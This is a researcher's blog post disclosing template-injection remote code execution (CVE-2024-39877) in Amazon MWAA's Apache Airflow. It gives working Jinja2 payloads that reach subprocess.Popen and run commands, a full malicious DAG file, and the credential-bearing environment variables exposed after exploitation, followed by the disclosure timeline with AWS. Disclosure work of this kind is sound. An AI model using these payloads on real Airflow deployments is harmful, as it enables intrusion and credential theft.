---
layout: post
title: Getting RCE in an AWS service (Amazon MWAA)
excerpt_separator: <!--more-->
---

Amazon Managed Workflows for Apache Airflow (MWAA) is a managed service to run Apache Airflow on AWS without managing infrastructure. However, most installations are affected by CVE-2024-39877, an SSTI vulnerability which allows remote code execution.

<!--more-->

This is because Amazon has been offering 8 different versions of Apache Airflow, and 6 of them are vulnerable to CVE-2024-39877. After reporting this problem, 3 of the 6 vulnerable versions are not offered anymore and they have applied patches to the other 3 previously vulnerable versions.

In this post I will explain how incredibly easy it is to exploit this in AWS, which makes this an even more critical vulnerability in my opinion (despite that, as I will explain later, AWS VDP surprisingly considers this a low-severity vulnerability).

<br>


## Local testing

After finding the Apache Airflow used by the AWS MWAA instance I was testing was using the 2.9.2 version, I decided to find possible attacks for this specific version and test them locally first.

CVE-2024-39877 is a vulnerability affecting Apache Airflow versions 2.4.0 to 2.9.2, included. It allows authenticated users with DAG editing permissions to inject malicious Jinja2 templates into the **doc_md field**, leading to RCE. 

It is perfectly explained in this [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/), but I still needed to dig a little more in it to actually execute commands.

First, I installed the software using Docker. The Amazon MWAA instance was using the 2.9.2 version, so I used the same:

```
sudo docker pull apache/airflow:2.9.2
curl -LfO 'https://airflow.apache.org/docs/apache-airflow/2.9.2/docker-compose.yaml'
mkdir -p ./dags ./logs ./plugins ./config && echo -e "AIRFLOW_UID=$(id -u)" > .env
sudo docker-compose up airflow-init
sudo docker-compose up
```

Then, I created a new DAG file (which are actually Python files with the typical ".py" extension) and placed it in the recently created "dags" folder. This basic payload exploits the SSTI vulnerability and prints the result of the multiplication:

```
doc_md="""
{{ 3*3 }}
"""
```


![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_1.png)


Next, the list of classes using the same payload from the Securelayer7 blog:

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__() }}
"""
```


![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_2.png)


This shows the SSTI attack was successful and the list of classes contains the *subprocess.Popen* class, which, as mentioned in the blog, is useful for executing commands remotely. 

To actually call this class, we need to find the index from the list of classes. I could not figure out a way to automate it inside the SSTI payload, but you can use any way or dirty code to get the correct index for your installation. 

For example, with this list:

```
[<class 'type'>, <class 'async_generator'>, <class 'subProcess.Popen'> ,...]
```

The class *subProcess.Popen* is the third element, but in Python the first element has index 0, so the class index we will use is 2.

In my case it is the index number 309, so I will first print the name of the class to make sure it is "Popen":

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
"""
```


![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_3.png)


If the class name from the previous step is correct, the index is the correct one so it is possible to execute commands like this:

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
"""
```


![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_4.png)


A complete malicious DAG file could look like this:

```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("Hello World from Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

with DAG(
    dag_id='test_3',
    default_args=default_args,
    description='Un DAG cualquiera',
    schedule_interval='@daily',
    start_date=datetime(2025, 5, 7),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 3
    ### Class Name
    {{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
    ### Command Output
    {{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
    """
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```


If you would like to test this you can grab the files from the repository:

- [test1.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test1.py): The basic payload, it will print "9" if the SSTI is correct.

- [test2.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test2.py): Print all the direct subclasses of the object class.

- [test3.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test3.py): Print the class name and the output from "id" command assuming the index is 309 (update it with the output from test2.py!!!).


<br>

--------------------------

## Amazon MWAA testing

At the moment of writing this post, Amazon allows to set up the Apache Airflow using the versions v2.10.3, v2.10.1, v2.9.2, v2.8.1, v2.7.2, v2.6.3, v2.5.1, v2.4.3 as you can see in this link: [https://docs.aws.amazon.com/mwaa/latest/userguide/create-environment.html#create-environment-regions-aa-versions](https://docs.aws.amazon.com/mwaa/latest/userguide/create-environment.html#create-environment-regions-aa-versions).

![img9](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_9.png)

**Update from July 2025**: Now the versions 2.4.3, 2.5.1 and 2.6.3 are not available anymore.

However, all these versions except v2.10.3 and v2.10.1 are vulnerable to CVE-2024-39877, the SSTI exploit I used to get remote command execution locally, as you can check in the NIST page: [https://nvd.nist.gov/vuln/detail/cve-2024-39877](https://nvd.nist.gov/vuln/detail/cve-2024-39877).

The only difference in this case is that the DAG files are not uploaded to a "dags" folder in the filesystem, but instead to an S3 bucket. So, in order to compromise this Amazon service, the prerequisites are:

- The Apache Airflow version must be 2.9.2 or below.

- You need to be authenticated to the Apache Airflow web panel as any user.

- You need to have permissions to write the DAG files to the S3 bucket.

For me, this was easy to obtain as this was a penetration test and not a Red Team assessment, so I could ask the affected team to upload the necessary files. If this had been an Apache Airflow installation and not the Amazon service, I would have been in a similar situation because I would have needed to upload the DAG files to the filesystem anyway.

<br>

To test the MWAA service, I sent the 3 files from this repository containing the different payloads:

- [test1.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test1.py): With a very simple payload ({{ 3\*3 }}). This prints "9"... Success!

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_5.jpg)


- [test2.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test1.py): With the code to list the available classes. This lists the subclasses... Success!

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_6.jpg)


- [test3.py](https://github.com/ricardojoserf/amazon-mwaa-RCE/blob/main/test3.py): With the code to execute "cat /etc/passwd" assuming the index was 309. This one generates an error... Not success :(

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_7.jpg)

This was expected, because the order of the classes (as retrieved after uploading test2.py) is different for each instance of Apache Airflow I have tested. So it is time to read the output from the second DAG file again, find the correct index of the *subprocess.Popen* class, reupload the third file with the updated index and...

![img8](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_8.jpg)


... Success! RCE in Amazon MWAA :)


<br>

Now, what can we get from this RCE, apart from running any command in the EC2 instance of Amazon MWAA? For example, listing all the environment variables, which contain credentials to connect to other AWS services. Some of these variables are:

- *AIRFLOW__CELERY__RESULT_BACKEND* and *AIRFLOW__DATABASE__SQL_ALCHEMY_CONN*: PostgreSQL connection URI

- *DB_SECRETS* and *MWAA__DB__CREDENTIALS*: PostgreSQL credentials

- *MWAA__CORE__FERNET_KEY* and *FERNET_SECRET*: Fernet key used for encryption

<br>

--------------------------

## Responsible Disclosure Timeline

24/6/25 - Reported to AWS VDP through HackerOne (report #3217840).

26/6/25 - RCE confirmed and severity was changed from High (8.5) to High.

21/7/25 - AWS VDP closed the report as "Informative", changed severity from High to Low and sent the reward (40 dollars for the AWS Merch Store).

27/7/25 - Asked the report to be made public.

<br>

--------------------------

## Conclusion

After almost a month since I reported this vulnerability, AWS VDP decided to close the report and lower the severity from "High" to "Low" arguing that it is a "low-risk" vulnerability. I think that even if the risk could be low, the impact is high (it is a RCE!) so the severity could be different to "low". At the same time, code execution is the whole point of Apache Airflow... but CVE-2024-39877 got a CVSS of 8.8, so I still think this is not the expected way to execute code in these systems! 

At the end of the day this is a VDP (Vulnerability Disclosure Program), so regardless the criticality they could choose not to pay any reward to the researchers, even if the severity is High or Critical. So after spending so many hours with this topic, still I am glad they have stopped offering 3 of the 6 vulnerable versions and applied patches to the other 3 versions. 

However, the reward (40 dollars to spend in the AWS Merch Store) is not worth all the time spent with this topic. To make sure AWS services are secure, it is not a good idea just to rely on researchers' good faith!

But still, I am happy I could order a cool sweater I hope I will be receiving in the next months (with the 40 dollars of the reward)... and that they patched the Apache Airflow versions! (nah, I am happier about the sweater)

<br>

--------------------------

## Sources

- [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/): Fantastic explanation of the CVE-2024-39877 vulnerability.

- [HackerOne report](https://hackerone.com/reports/3217840): It will hopefully be public soon.

<br>
